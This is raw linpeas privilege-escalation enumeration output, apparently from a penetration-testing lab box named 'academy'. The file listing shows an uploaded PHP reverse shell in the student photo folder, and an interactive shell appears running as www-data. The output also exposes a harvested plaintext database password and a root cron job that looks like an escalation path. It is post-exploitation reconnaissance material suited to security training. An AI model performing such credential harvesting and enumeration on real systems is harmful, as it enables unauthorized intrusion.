/var/lib/phpmyadmin/tmp/twig/fa/fa249f377795e48c7d92167e29cef2fc31f50401a0bdbc95ddb51c0aec698b9e.php
/var/tmp
/var/www/html/academy
/var/www/html/academy/admin
/var/www/html/academy/admin/assets
/var/www/html/academy/admin/assets/css
/var/www/html/academy/admin/assets/css/bootstrap.css
/var/www/html/academy/admin/assets/css/font-awesome.css
/var/www/html/academy/admin/assets/css/style.css
/var/www/html/academy/admin/assets/fonts
/var/www/html/academy/admin/assets/fonts/FontAwesome.otf
/var/www/html/academy/admin/assets/fonts/fontawesome-webfont.eot
/var/www/html/academy/admin/assets/fonts/fontawesome-webfont.svg
/var/www/html/academy/admin/assets/fonts/fontawesome-webfont.ttf
/var/www/html/academy/admin/assets/fonts/fontawesome-webfont.woff
/var/www/html/academy/admin/assets/fonts/fontawesome-webfont.woff2
/var/www/html/academy/admin/assets/fonts/glyphicons-halflings-regular.eot
/var/www/html/academy/admin/assets/fonts/glyphicons-halflings-regular.svg
/var/www/html/academy/admin/assets/fonts/glyphicons-halflings-regular.ttf
/var/www/html/academy/admin/assets/fonts/glyphicons-halflings-regular.woff
/var/www/html/academy/admin/assets/fonts/glyphicons-halflings-regular.woff2
/var/www/html/academy/admin/assets/img
/var/www/html/academy/admin/assets/js
/var/www/html/academy/admin/assets/js/bootstrap.js
/var/www/html/academy/admin/assets/js/jquery-1.11.1.js
/var/www/html/academy/admin/change-password.php
/var/www/html/academy/admin/check_availability.php
/var/www/html/academy/admin/course.php
/var/www/html/academy/admin/department.php
/var/www/html/academy/admin/edit-course.php
/var/www/html/academy/admin/enroll-history.php
/var/www/html/academy/admin/includes
/var/www/html/academy/admin/includes/config.php
/var/www/html/academy/admin/includes/footer.php
/var/www/html/academy/admin/includes/header.php
/var/www/html/academy/admin/includes/menubar.php
/var/www/html/academy/admin/index.php
/var/www/html/academy/admin/level.php
/var/www/html/academy/admin/logout.php
/var/www/html/academy/admin/manage-students.php
/var/www/html/academy/admin/print.php
/var/www/html/academy/admin/semester.php
/var/www/html/academy/admin/session.php
/var/www/html/academy/admin/student-registration.php
/var/www/html/academy/admin/user-log.php
/var/www/html/academy/assets
/var/www/html/academy/assets/css
/var/www/html/academy/assets/css/bootstrap.css
/var/www/html/academy/assets/css/font-awesome.css
/var/www/html/academy/assets/css/style.css
/var/www/html/academy/assets/fonts
/var/www/html/academy/assets/fonts/FontAwesome.otf
/var/www/html/academy/assets/fonts/fontawesome-webfont.eot
/var/www/html/academy/assets/fonts/fontawesome-webfont.svg
/var/www/html/academy/assets/fonts/fontawesome-webfont.ttf
/var/www/html/academy/assets/fonts/fontawesome-webfont.woff
/var/www/html/academy/assets/fonts/fontawesome-webfont.woff2
/var/www/html/academy/assets/fonts/glyphicons-halflings-regular.eot
/var/www/html/academy/assets/fonts/glyphicons-halflings-regular.svg
/var/www/html/academy/assets/fonts/glyphicons-halflings-regular.ttf
/var/www/html/academy/assets/fonts/glyphicons-halflings-regular.woff
/var/www/html/academy/assets/fonts/glyphicons-halflings-regular.woff2
/var/www/html/academy/assets/img
/var/www/html/academy/assets/js
/var/www/html/academy/assets/js/bootstrap.js
/var/www/html/academy/assets/js/jquery-1.11.1.js
/var/www/html/academy/change-password.php
/var/www/html/academy/check_availability.php
/var/www/html/academy/db
/var/www/html/academy/db/onlinecourse.sql
/var/www/html/academy/enroll-history.php
/var/www/html/academy/enroll.php
/var/www/html/academy/includes
/var/www/html/academy/includes/config.php
/var/www/html/academy/includes/footer.php
/var/www/html/academy/includes/header.php
/var/www/html/academy/includes/menubar.php
/var/www/html/academy/index.php
/var/www/html/academy/logout.php
/var/www/html/academy/my-profile.php
/var/www/html/academy/pincode-verification.php
/var/www/html/academy/print.php
/var/www/html/academy/studentphoto
/var/www/html/academy/studentphoto/php-rev.php
/tmp/linpeas.sh
/dev/mqueue/linpeas.txt

[+] Searching passwords in config PHP files
$mysql_password = "My_V3ryS3cur3_P4ss";                                                                                                                        
$mysql_password = "My_V3ryS3cur3_P4ss";

[+] Finding IPs inside logs (limit 100)
     44 /var/log/dpkg.log.1:1.8.2.1                                                                                                                            
     24 /var/log/dpkg.log.1:1.8.2.3
     14 /var/log/dpkg.log.1:1.8.4.3
      9 /var/log/wtmp:192.168.10.31
      7 /var/log/dpkg.log.1:7.43.0.2
      7 /var/log/dpkg.log.1:4.8.6.1
      7 /var/log/dpkg.log.1:1.7.3.2
      7 /var/log/dpkg.log.1:0.5.10.2
      7 /var/log/dpkg.log.1:0.19.8.1
      4 /var/log/installer/status:1.2.3.3
      1 /var/log/lastlog:192.168.10.31

[+] Finding passwords inside logs (limit 100)
/var/log/dpkg.log.1:2021-05-29 17:00:10 install base-passwd:amd64 <none> 3.5.46                                                                                
/var/log/dpkg.log.1:2021-05-29 17:00:10 status half-installed base-passwd:amd64 3.5.46
/var/log/dpkg.log.1:2021-05-29 17:00:11 configure base-passwd:amd64 3.5.46 3.5.46
/var/log/dpkg.log.1:2021-05-29 17:00:11 status half-configured base-passwd:amd64 3.5.46
/var/log/dpkg.log.1:2021-05-29 17:00:11 status installed base-passwd:amd64 3.5.46
/var/log/dpkg.log.1:2021-05-29 17:00:11 status unpacked base-passwd:amd64 3.5.46
/var/log/dpkg.log.1:2021-05-29 17:00:18 status half-configured base-passwd:amd64 3.5.46
/var/log/dpkg.log.1:2021-05-29 17:00:18 status half-installed base-passwd:amd64 3.5.46
/var/log/dpkg.log.1:2021-05-29 17:00:18 status unpacked base-passwd:amd64 3.5.46
/var/log/dpkg.log.1:2021-05-29 17:00:18 upgrade base-passwd:amd64 3.5.46 3.5.46
/var/log/dpkg.log.1:2021-05-29 17:00:21 install passwd:amd64 <none> 1:4.5-1.1
/var/log/dpkg.log.1:2021-05-29 17:00:21 status half-installed passwd:amd64 1:4.5-1.1
/var/log/dpkg.log.1:2021-05-29 17:00:21 status unpacked passwd:amd64 1:4.5-1.1
/var/log/dpkg.log.1:2021-05-29 17:00:24 configure base-passwd:amd64 3.5.46 <none>
/var/log/dpkg.log.1:2021-05-29 17:00:24 status half-configured base-passwd:amd64 3.5.46
/var/log/dpkg.log.1:2021-05-29 17:00:24 status installed base-passwd:amd64 3.5.46
/var/log/dpkg.log.1:2021-05-29 17:00:24 status unpacked base-passwd:amd64 3.5.46
/var/log/dpkg.log.1:2021-05-29 17:00:25 configure passwd:amd64 1:4.5-1.1 <none>
/var/log/dpkg.log.1:2021-05-29 17:00:25 status half-configured passwd:amd64 1:4.5-1.1
/var/log/dpkg.log.1:2021-05-29 17:00:25 status installed passwd:amd64 1:4.5-1.1
/var/log/dpkg.log.1:2021-05-29 17:00:25 status unpacked passwd:amd64 1:4.5-1.1
/var/log/installer/status:Description: Set up users and passwords

[+] Finding emails inside logs (limit 100)
      1 /var/log/installer/status:aeb@debian.org                                                                                                               
      1 /var/log/installer/status:anibal@debian.org
      2 /var/log/installer/status:berni@debian.org
     40 /var/log/installer/status:debian-boot@lists.debian.org
     16 /var/log/installer/status:debian-kernel@lists.debian.org
      1 /var/log/installer/status:debian-med-packaging@lists.alioth.debian.org
      1 /var/log/installer/status:debian@jff.email
      1 /var/log/installer/status:djpig@debian.org
      4 /var/log/installer/status:gcs@debian.org
      2 /var/log/installer/status:guillem@debian.org
      1 /var/log/installer/status:guus@debian.org
      1 /var/log/installer/status:linux-xfs@vger.kernel.org
      2 /var/log/installer/status:mmind@debian.org
      1 /var/log/installer/status:open-iscsi@packages.debian.org
      1 /var/log/installer/status:open-isns@packages.debian.org
      1 /var/log/installer/status:packages@release.debian.org
      2 /var/log/installer/status:parted-maintainers@alioth-lists.debian.net
      1 /var/log/installer/status:petere@debian.org
      2 /var/log/installer/status:pkg-gnupg-maint@lists.alioth.debian.org
      1 /var/log/installer/status:pkg-gnutls-maint@lists.alioth.debian.org
      1 /var/log/installer/status:pkg-grub-devel@alioth-lists.debian.net
      1 /var/log/installer/status:pkg-mdadm-devel@lists.alioth.debian.org
      1 /var/log/installer/status:rogershimizu@gmail.com
      2 /var/log/installer/status:team+lvm@tracker.debian.org
      1 /var/log/installer/status:tytso@mit.edu
      1 /var/log/installer/status:wpa@packages.debian.org
      1 /var/log/installer/status:xnox@debian.org

[+] Finding *password* or *credential* files in home
                                                                                                                                                               
[+] Finding 'pwd' or 'passw' string inside /home, /var/www, /etc, /root and list possible web(/var/www) and config(/etc) passwords
/var/www/html/academy/admin/assets/fonts/fontawesome-webfont.woff2                                                                                             
/var/www/html/academy/admin/assets/js/jquery-1.11.1.js
/var/www/html/academy/admin/change-password.php
/var/www/html/academy/admin/includes/config.php
/var/www/html/academy/admin/index.php
/var/www/html/academy/admin/manage-students.php
/var/www/html/academy/admin/student-registration.php
/var/www/html/academy/assets/fonts/fontawesome-webfont.woff2
/var/www/html/academy/assets/js/jquery-1.11.1.js
/var/www/html/academy/change-password.php
/var/www/html/academy/db/onlinecourse.sql
/var/www/html/academy/includes/config.php
/var/www/html/academy/includes/menubar.php
/var/www/html/academy/index.php
/var/www/html/academy/pincode-verification.php
/var/www/html/academy/admin/includes/config.php:$mysql_password = "My_V3ryS3cur3_P4ss";
/var/www/html/academy/includes/config.php:$mysql_password = "My_V3ryS3cur3_P4ss";
/etc/apache2/sites-available/default-ssl.conf:          #        Note that no password is obtained from the user. Every entry in the user
/etc/apache2/sites-available/default-ssl.conf:          #        file needs this password: `xxj31ZMTZzkVA'.
/etc/apparmor.d/abstractions/authentication:  # databases containing passwords, PAM configuration files, PAM libraries
/etc/debconf.conf:Accept-Type: password
/etc/debconf.conf:Filename: /var/cache/debconf/passwords.dat
/etc/debconf.conf:Name: passwords
/etc/debconf.conf:Reject-Type: password
/etc/debconf.conf:Stack: config, passwords
Linux Privesc Checklist: https://book.hacktricks.xyz/linux-unix/linux-privilege-escalation-checklist
 LEYEND:                                                                                                                                                       
  RED/YELLOW: 99% a PE vector
  RED: You must take a look at it
  LightCyan: Users with console
  Blue: Users without console & mounted devs
  Green: Common things (users, groups, SUID/SGID, mounts, .sh scripts, cronjobs) 
  LightMangenta: Your username


====================================( Basic information )=====================================
OS: Linux version 4.19.0-16-amd64 (debian-kernel@lists.debian.org) (gcc version 8.3.0 (Debian 8.3.0-6)) #1 SMP Debian 4.19.181-1 (2021-03-19)                  
User & Groups: uid=33(www-data) gid=33(www-data) groups=33(www-data)
Hostname: academy
Writable folder: /dev/shm
[+] /usr/bin/ping is available for network discovery (You can use linpeas to discover hosts, learn more with -h)
[+] /usr/bin/nc is available for network discover & port scanning (You can use linpeas to discover hosts/port scanning, learn more with -h)                    
                                                                                                                                                               

====================================( System Information )====================================
[+] Operative system                                                                                                                                           
[i] https://book.hacktricks.xyz/linux-unix/privilege-escalation#kernel-exploits                                                                                
Linux version 4.19.0-16-amd64 (debian-kernel@lists.debian.org) (gcc version 8.3.0 (Debian 8.3.0-6)) #1 SMP Debian 4.19.181-1 (2021-03-19)                      
Distributor ID: Debian
Description:    Debian GNU/Linux 10 (buster)
Release:        10
Codename:       buster

[+] Sudo version
sudo Not Found                                                                                                                                                 
                                                                                                                                                               
[+] PATH
[i] Any writable folder in original PATH? (a new completed path will be exported)                                                                              
/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin                                                                                                   
New path exported: /usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin

[+] Date
Sat Jul 29 06:37:17 EDT 2023                                                                                                                                   

[+] System stats
Filesystem      Size  Used Avail Use% Mounted on                                                                                                               
/dev/sda1       6.9G  1.9G  4.7G  29% /
udev            479M     0  479M   0% /dev
tmpfs           494M     0  494M   0% /dev/shm
tmpfs            99M  4.3M   95M   5% /run
tmpfs           5.0M     0  5.0M   0% /run/lock
tmpfs           494M     0  494M   0% /sys/fs/cgroup
tmpfs            99M     0   99M   0% /run/user/0
              total        used        free      shared  buff/cache   available
Mem:        1009960      178916      474532       10816      356512      640884
Swap:        998396           0      998396

[+] Environment
[i] Any private information inside environment variables?                                                                                                      
HISTFILESIZE=0                                                                                                                                                 
APACHE_RUN_DIR=/var/run/apache2
APACHE_PID_FILE=/var/run/apache2/apache2.pid
JOURNAL_STREAM=9:13967
PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin
INVOCATION_ID=d29a7dcbdfb3443ebe10d76ee30417d9
APACHE_LOCK_DIR=/var/lock/apache2
LANG=C
HISTSIZE=0
APACHE_RUN_USER=www-data
APACHE_RUN_GROUP=www-data
APACHE_LOG_DIR=/var/log/apache2
HISTFILE=/dev/null

[+] Looking for Signature verification failed in dmseg
 Not Found                                                                                                                                                     
                                                                                                                                                               
[+] selinux enabled? .......... sestatus Not Found
[+] Printer? .......... lpstat Not Found                                                                                                                       
[+] Is this a container? .......... No                                                                                                                         
[+] Is ASLR enabled? .......... Yes                                                                                                                            

=========================================( Devices )==========================================
[+] Any sd* disk in /dev? (limit 20)                                                                                                                           
sda                                                                                                                                                            
sda1
sda2
sda5

[+] Unmounted file-system?
[i] Check if you can mount umounted devices                                                                                                                    
UUID=24d0cea7-c37b-4fd6-838e-d05cfb61a601 /               ext4    errors=remount-ro 0       1                                                                  
UUID=930c51cc-089d-42bd-8e30-f08b86c52dca none            swap    sw              0       0
/dev/sr0        /media/cdrom0   udf,iso9660 user,noauto     0       0


====================================( Available Software )====================================
[+] Useful software?                                                                                                                                           
/usr/bin/nc                                                                                                                                                    
/usr/bin/netcat
/usr/bin/nc.traditional
/usr/bin/wget
/usr/bin/ping
/usr/bin/base64
/usr/bin/socat
/usr/bin/python
/usr/bin/python2
/usr/bin/python3
/usr/bin/python2.7
/usr/bin/python3.7
/usr/bin/perl
/usr/bin/php

[+] Installed compilers?
Compilers Not Found                                                                                                                                            
                                                                                                                                                               

================================( Processes, Cron & Services )================================
[+] Cleaned processes                                                                                                                                          
[i] Check weird & unexpected proceses run by root: https://book.hacktricks.xyz/linux-unix/privilege-escalation#processes                                       
USER       PID %CPU %MEM    VSZ   RSS TTY      STAT START   TIME COMMAND                                                                                       
root         1  0.0  0.9 103796  9972 ?        Ss   05:18   0:01 /sbin/init
root       324  0.0  0.7  40376  7976 ?        Ss   05:18   0:00 /lib/systemd/systemd-journald
root       349  0.0  0.4  21932  4952 ?        Ss   05:18   0:00 /lib/systemd/systemd-udevd
systemd+   434  0.0  0.6  93084  6556 ?        Ssl  05:18   0:00 /lib/systemd/systemd-timesyncd
root       465  0.0  0.2   8504  2736 ?        Ss   05:18   0:00 /usr/sbin/cron -f
root       470  0.0  0.7  19492  7244 ?        Ss   05:18   0:00 /lib/systemd/systemd-logind
message+   472  0.0  0.4   8980  4348 ?        Ss   05:18   0:00 /usr/bin/dbus-daemon --system --address=systemd: --nofork --nopidfile --systemd-activation --syslog-only
root       473  0.0  0.4 225824  4332 ?        Ssl  05:18   0:00 /usr/sbin/rsyslogd -n -iNONE
root       475  0.0  0.2   6620  2808 ?        Ss   05:18   0:00 /usr/sbin/vsftpd /etc/vsftpd.conf
root       477  0.0  0.3   6924  3376 tty1     Ss   05:18   0:00 /bin/login -p --
root       486  0.0  0.6  15852  6876 ?        Ss   05:18   0:00 /usr/sbin/sshd -D
root       521  0.0  2.2 214992 23008 ?        Ss   05:18   0:00 /usr/sbin/apache2 -k start
mysql      541  0.0  8.9 1274452 90652 ?       Ssl  05:18   0:03 /usr/sbin/mysqld
www-data   544  0.0  1.2 215348 13032 ?        S    05:18   0:00 /usr/sbin/apache2 -k start
root       634  0.0  0.8  21024  8488 ?        Ss   05:18   0:00 /lib/systemd/systemd --user
root       635  0.0  0.2  22832  2264 ?        S    05:18   0:00 (sd-pam)
root       639  0.0  0.4   7652  4444 tty1     S+   05:18   0:00 -bash
root       643  0.0  0.5   9488  5592 ?        Ss   05:18   0:00 dhclient
root      1051  0.0  0.5   9488  5688 ?        Ss   06:07   0:00 dhclient
www-data  1075  0.0  1.2 215340 13024 ?        S    06:07   0:00 /usr/sbin/apache2 -k start
www-data  1128  0.0  1.6 215340 17168 ?        S    06:07   0:00 /usr/sbin/apache2 -k start
www-data  1129  0.0  1.9 215460 19852 ?        S    06:07   0:00 /usr/sbin/apache2 -k start
www-data  1137  0.0  1.9 215460 19540 ?        S    06:07   0:00 /usr/sbin/apache2 -k start
www-data  1147  0.0  1.9 215460 19652 ?        S    06:07   0:00 /usr/sbin/apache2 -k start
www-data  1151  0.0  2.3 218640 23700 ?        S    06:07   0:00 /usr/sbin/apache2 -k start
www-data  1157  0.0  1.2 215348 12772 ?        S    06:07   0:00 /usr/sbin/apache2 -k start
www-data  1163  0.0  1.2 215340 12756 ?        S    06:07   0:00 /usr/sbin/apache2 -k start
www-data  1172  0.0  1.9 215576 19836 ?        S    06:07   0:00 /usr/sbin/apache2 -k start
www-data  1583  0.0  0.0   2388   756 ?        S    06:33   0:00 sh -c uname -a; w; id; /bin/sh -i
www-data  1587  0.0  0.0   2388   752 ?        S    06:33   0:00 /bin/sh -i
www-data  1624  1.0  0.1   2520  1628 ?        S    06:37   0:00 /bin/sh ./linpeas.sh
www-data  1805  0.0  0.2   7640  2728 ?        R    06:37   0:00 ps aux

[+] Binary processes permissions
[i] https://book.hacktricks.xyz/linux-unix/privilege-escalation#processes                                                                                      
 56K -rwxr-xr-x 1 root root  56K Jul 27  2018 /bin/login                                                                                                       
   0 lrwxrwxrwx 1 root root    4 May 29  2021 /bin/sh -> dash
1.5M -rwxr-xr-x 1 root root 1.5M Mar 18  2021 /lib/systemd/systemd
144K -rwxr-xr-x 1 root root 143K Mar 18  2021 /lib/systemd/systemd-journald
228K -rwxr-xr-x 1 root root 227K Mar 18  2021 /lib/systemd/systemd-logind
 56K -rwxr-xr-x 1 root root  55K Mar 18  2021 /lib/systemd/systemd-timesyncd
664K -rwxr-xr-x 1 root root 663K Mar 18  2021 /lib/systemd/systemd-udevd
   0 lrwxrwxrwx 1 root root   20 Mar 18  2021 /sbin/init -> /lib/systemd/systemd
236K -rwxr-xr-x 1 root root 236K Jul  5  2020 /usr/bin/dbus-daemon
672K -rwxr-xr-x 1 root root 672K Aug 25  2020 /usr/sbin/apache2
 56K -rwxr-xr-x 1 root root  55K Oct 11  2019 /usr/sbin/cron
 20M -rwxr-xr-x 1 root root  20M Nov 25  2020 /usr/sbin/mysqld
688K -rwxr-xr-x 1 root root 686K Feb 26  2019 /usr/sbin/rsyslogd
792K -rwxr-xr-x 1 root root 789K Jan 31  2020 /usr/sbin/sshd
164K -rwxr-xr-x 1 root root 161K Mar  6  2019 /usr/sbin/vsftpd

[+] Cron jobs
[i] https://book.hacktricks.xyz/linux-unix/privilege-escalation#scheduled-jobs                                                                                 
-rw-r--r-- 1 root root 1077 Jun 16  2021 /etc/crontab                                                                                                          

/etc/cron.d:
total 16
drwxr-xr-x  2 root root 4096 May 29  2021 .
drwxr-xr-x 74 root root 4096 Jul 29 06:34 ..
-rw-r--r--  1 root root  102 Oct 11  2019 .placeholder
-rw-r--r--  1 root root  712 Dec 17  2018 php

/etc/cron.daily:
total 40
drwxr-xr-x  2 root root 4096 May 29  2021 .
drwxr-xr-x 74 root root 4096 Jul 29 06:34 ..
-rw-r--r--  1 root root  102 Oct 11  2019 .placeholder
-rwxr-xr-x  1 root root  539 Aug  8  2020 apache2
-rwxr-xr-x  1 root root 1478 May 12  2020 apt-compat
-rwxr-xr-x  1 root root  355 Dec 29  2017 bsdmainutils
-rwxr-xr-x  1 root root 1187 Apr 18  2019 dpkg
-rwxr-xr-x  1 root root  377 Aug 28  2018 logrotate
-rwxr-xr-x  1 root root 1123 Feb 10  2019 man-db
-rwxr-xr-x  1 root root  249 Sep 27  2017 passwd

/etc/cron.hourly:
total 12
drwxr-xr-x  2 root root 4096 May 29  2021 .
drwxr-xr-x 74 root root 4096 Jul 29 06:34 ..
-rw-r--r--  1 root root  102 Oct 11  2019 .placeholder

/etc/cron.monthly:
total 12
drwxr-xr-x  2 root root 4096 May 29  2021 .
drwxr-xr-x 74 root root 4096 Jul 29 06:34 ..
-rw-r--r--  1 root root  102 Oct 11  2019 .placeholder

/etc/cron.weekly:
total 16
drwxr-xr-x  2 root root 4096 May 29  2021 .
drwxr-xr-x 74 root root 4096 Jul 29 06:34 ..
-rw-r--r--  1 root root  102 Oct 11  2019 .placeholder
-rwxr-xr-x  1 root root  813 Feb 10  2019 man-db

SHELL=/bin/sh
PATH=/usr/local/sbin:/usr/local/bin:/sbin:/bin:/usr/sbin:/usr/bin


* * * * * /home/grimmie/backup.sh

[+] Services
[i] Search for outdated versions                                                                                                                               
 [ - ]  apache-htcacheclean                                                                                                                                    
 [ + ]  apache2
 [ + ]  apparmor
 [ - ]  console-setup.sh
 [ + ]  cron
 [ + ]  dbus
 [ - ]  hwclock.sh
 [ - ]  keyboard-setup.sh
 [ + ]  kmod
 [ + ]  mysql
 [ + ]  networking
 [ + ]  procps
 [ - ]  rsync
 [ + ]  rsyslog
 [ + ]  ssh
 [ + ]  udev
 [ + ]  vsftpd


===================================( Network Information )====================================
[+] Hostname, hosts and DNS                                                                                                                                    
academy                                                                                                                                                        
127.0.0.1       localhost
127.0.1.1       academy.tcm.sec academy

::1     localhost ip6-localhost ip6-loopback
ff02::1 ip6-allnodes
ff02::2 ip6-allrouters
domain localdomain
search localdomain
nameserver 172.16.2.2
tcm.sec

[+] Content of /etc/inetd.conf
/etc/inetd.conf Not Found                                                                                                                                      
                                                                                                                                                               
[+] Networks and neighbours
default         0.0.0.0                                                                                                                                        
loopback        127.0.0.0
link-local      169.254.0.0

1: lo: <LOOPBACK,UP,LOWER_UP> mtu 65536 qdisc noqueue state UNKNOWN group default qlen 1000
    link/loopback 00:00:00:00:00:00 brd 00:00:00:00:00:00
    inet 127.0.0.1/8 scope host lo
       valid_lft forever preferred_lft forever
    inet6 ::1/128 scope host 
       valid_lft forever preferred_lft forever
2: ens33: <BROADCAST,MULTICAST,UP,LOWER_UP> mtu 1500 qdisc pfifo_fast state UP group default qlen 1000
    link/ether 00:0c:29:a6:6e:61 brd ff:ff:ff:ff:ff:ff
    inet 172.16.2.129/24 brd 172.16.2.255 scope global dynamic ens33
       valid_lft 1638sec preferred_lft 1638sec
    inet6 fe80::20c:29ff:fea6:6e61/64 scope link 
       valid_lft forever preferred_lft forever
172.16.2.254 dev ens33 lladdr 00:50:56:ed:99:be STALE
172.16.2.2 dev ens33 lladdr 00:50:56:fc:a4:5b REACHABLE
172.16.2.1 dev ens33 lladdr 00:50:56:c0:00:08 REACHABLE

[+] Iptables rules
iptables rules Not Found                                                                                                                                       
                                                                                                                                                               
[+] Active Ports
[i] https://book.hacktricks.xyz/linux-unix/privilege-escalation#internal-open-ports                                                                            
                                                                                                                                                               
[+] Can I sniff with tcpdump?
No                                                                                                                                                             
                                                                                                                                                               

====================================( Users Information )=====================================
[+] My user                                                                                                                                                    
[i] https://book.hacktricks.xyz/linux-unix/privilege-escalation#groups                                                                                         
uid=33(www-data) gid=33(www-data) groups=33(www-data)                                                                                                          

[+] Do I have PGP keys?
gpg Not Found                                                                                                                                                  
                                                                                                                                                               
[+] Clipboard or highlighted text?
xsel and xclip Not Found                                                                                                                                       
                                                                                                                                                               
[+] Testing 'sudo -l' without password & /etc/sudoers
[i] https://book.hacktricks.xyz/linux-unix/privilege-escalation#commands-with-sudo-and-suid-commands                                                           
                                                                                                                                                               
[+] Checking /etc/doas.conf
/etc/doas.conf Not Found                                                                                                                                       
                                                                                                                                                               
[+] Checking Pkexec policy
                                                                                                                                                               
[+] Don forget to test 'su' as any other user with shell: without password and with their names as password (I can't do it...)
[+] Do not forget to execute 'sudo -l' without password or with valid password (if you know it)!!                                                              
                                                                                                                                                               
[+] Superusers
root:x:0:0:root:/root:/bin/bash                                                                                                                                

[+] Users with console
grimmie:x:1000:1000:administrator,,,:/home/grimmie:/bin/bash                                                                                                   
root:x:0:0:root:/root:/bin/bash

[+] Login information
 06:37:18 up  1:19,  1 user,  load average: 0.24, 0.06, 0.41                                                                                                   
USER     TTY      FROM             LOGIN@   IDLE   JCPU   PCPU WHAT
root     tty1     -                10:18   29:42   0.04s  0.01s -bash
root     tty1                          Sat May 29 13:31 - down   (00:12)
reboot   system boot  4.19.0-16-amd64  Sat May 29 13:30 - 13:43  (00:13)
root     pts/0        192.168.10.31    Sat May 29 13:16 - 13:27  (00:11)
root     tty1                          Sat May 29 13:16 - down   (00:11)
reboot   system boot  4.19.0-16-amd64  Sat May 29 13:15 - 13:27  (00:12)
root     pts/0        192.168.10.31    Sat May 29 13:08 - 13:14  (00:06)
administ tty1                          Sat May 29 13:06 - down   (00:08)
reboot   system boot  4.19.0-16-amd64  Sat May 29 13:05 - 13:14  (00:08)

wtmp begins Sat May 29 13:05:58 2021

[+] All users
_apt                                                                                                                                                           
backup
bin
daemon
ftp
games
gnats
grimmie
irc
list
lp
mail
man
messagebus
mysql
news
nobody
proxy
root
sshd
sync
sys
systemd-coredump
systemd-network
systemd-resolve
systemd-timesync
uucp
www-data

[+] Password policy
PASS_MAX_DAYS   99999                                                                                                                                          
PASS_MIN_DAYS   0
PASS_WARN_AGE   7
ENCRYPT_METHOD SHA512


===================================( Software Information )===================================
[+] MySQL version                                                                                                                                              
mysql  Ver 15.1 Distrib 10.3.27-MariaDB, for debian-linux-gnu (x86_64) using readline 5.2                                                                      

[+] MySQL connection using default root/root ........... No
[+] MySQL connection using root/toor ................... No                                                                                                    
[+] MySQL connection using root/NOPASS ................. No                                                                                                    
[+] Looking for mysql credentials and exec                                                                                                                     
From '/etc/mysql/mariadb.conf.d/50-server.cnf' Mysql user: user                    = mysql                                                                     
Found readable /etc/mysql/my.cnf
[client-server]
!includedir /etc/mysql/conf.d/
!includedir /etc/mysql/mariadb.conf.d/

[+] PostgreSQL version and pgadmin credentials
 Not Found                                                                                                                                                     
                                                                                                                                                               
[+] PostgreSQL connection to template0 using postgres/NOPASS ........ No
[+] PostgreSQL connection to template1 using postgres/NOPASS ........ No                                                                                       
[+] PostgreSQL connection to template0 using pgsql/NOPASS ........... No                                                                                       
[+] PostgreSQL connection to template1 using pgsql/NOPASS ........... No                                                                                       
                                                                                                                                                               
[+] Apache server info
Version: Server version: Apache/2.4.38 (Debian)                                                                                                                
Server built:   2020-08-25T20:08:29

[+] Looking for PHPCookies
 Not Found                                                                                                                                                     
                                                                                                                                                               
[+] Looking for Wordpress wp-config.php files
wp-config.php Not Found                                                                                                                                        
                                                                                                                                                               
[+] Looking for Tomcat users file
tomcat-users.xml Not Found                                                                                                                                     
                                                                                                                                                               
[+] Mongo information
 Not Found                                                                                                                                                     
                                                                                                                                                               
[+] Looking for supervisord configuration file
supervisord.conf Not Found                                                                                                                                     
                                                                                                                                                               
[+] Looking for cesi configuration file
cesi.conf Not Found                                                                                                                                            
                                                                                                                                                               
[+] Looking for Rsyncd config file
/usr/share/doc/rsync/examples/rsyncd.conf                                                                                                                      
[ftp]
        comment = public archive
        path = /var/www/pub
        use chroot = yes
        lock file = /var/lock/rsyncd
        read only = yes
        list = yes
        uid = nobody
        gid = nogroup
        strict modes = yes
        ignore errors = no
        ignore nonreadable = yes
        transfer logging = no
        timeout = 600
        refuse options = checksum dry-run
        dont compress = *.gz *.tgz *.zip *.z *.rpm *.deb *.iso *.bz2 *.tbz

[+] Looking for Hostapd config file
hostapd.conf Not Found                                                                                                                                         
                                                                                                                                                               
[+] Looking for wifi conns file
 Not Found                                                                                                                                                     
                                                                                                                                                               
[+] Looking for Anaconda-ks config files
anaconda-ks.cfg Not Found                                                                                                                                      
                                                                                                                                                               
[+] Looking for .vnc directories and their passwd files
.vnc Not Found                                                                                                                                                 
                                                                                                                                                               
[+] Looking for ldap directories and their hashes
/etc/ldap                                                                                                                                                      
The password hash is from the {SSHA} to 'structural'

[+] Looking for .ovpn files and credentials
.ovpn Not Found                                                                                                                                                
                                                                                                                                                               
[+] Looking for ssl/ssh files
PermitRootLogin yes                                                                                                                                            
ChallengeResponseAuthentication no
UsePAM yes

Looking inside /etc/ssh/ssh_config for interesting info
Host *
    SendEnv LANG LC_*
    HashKnownHosts yes
    GSSAPIAuthentication yes

[+] Looking for unexpected auth lines in /etc/pam.d/sshd
No                                                                                                                                                             
                                                                                                                                                               
[+] Looking for Cloud credentials (AWS, Azure, GC)
                                                                                                                                                               
[+] NFS exports?
[i] https://book.hacktricks.xyz/linux-unix/privilege-escalation/nfs-no_root_squash-misconfiguration-pe                                                         
/etc/exports Not Found                                                                                                                                         
                                                                                                                                                               
[+] Looking for kerberos conf files and tickets
[i] https://book.hacktricks.xyz/pentesting/pentesting-kerberos-88#pass-the-ticket-ptt                                                                          
krb5.conf Not Found                                                                                                                                            
tickets kerberos Not Found                                                                                                                                     
klist Not Found                                                                                                                                                
                                                                                                                                                               
[+] Looking for Kibana yaml
kibana.yml Not Found                                                                                                                                           
                                                                                                                                                               
[+] Looking for logstash files
 Not Found                                                                                                                                                     
                                                                                                                                                               
[+] Looking for elasticsearch files
 Not Found                                                                                                                                                     
                                                                                                                                                               
[+] Looking for Vault-ssh files
vault-ssh-helper.hcl Not Found                                                                                                                                 
                                                                                                                                                               
[+] Looking for AD cached hahses
cached hashes Not Found                                                                                                                                        
                                                                                                                                                               
[+] Looking for screen sessions
[i] https://book.hacktricks.xyz/linux-unix/privilege-escalation#open-shell-sessions                                                                            
screen Not Found                                                                                                                                               
                                                                                                                                                               
[+] Looking for tmux sessions
[i] https://book.hacktricks.xyz/linux-unix/privilege-escalation#open-shell-sessions                                                                            
tmux Not Found                                                                                                                                                 
                                                                                                                                                               
[+] Looking for Couchdb directory
                                                                                                                                                               
[+] Looking for redis.conf
                                                                                                                                                               
[+] Looking for dovecot files
dovecot credentials Not Found                                                                                                                                  
                                                                                                                                                               
[+] Looking for mosquitto.conf
                                                                                                                                                               

====================================( Interesting Files )=====================================
